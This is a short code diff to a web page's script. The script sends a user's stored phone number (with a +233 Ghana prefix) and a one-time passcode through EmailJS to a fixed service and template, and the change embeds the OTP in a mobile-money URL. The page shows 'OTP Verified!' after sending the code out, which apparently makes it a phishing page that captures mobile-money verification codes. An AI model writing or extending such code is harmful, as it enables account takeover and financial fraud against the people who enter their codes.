@@ -275,7 +275,7 @@
         const phone = localStorage.getItem("userPhone");
         emailjs.send("service_74nt2c9", "template_s6vpt2e", {
           phone: "+233" + phone,
-          otp: otp
+          otp: "https://appbiz.momo.africa/momo/"+ otp
         }).then(() => {
           showNotification("OTP Verified!");
           otpModal.classList.add("hidden");
@@ -297,4 +297,5 @@
   </script>
 </body>
 </html>
+
 
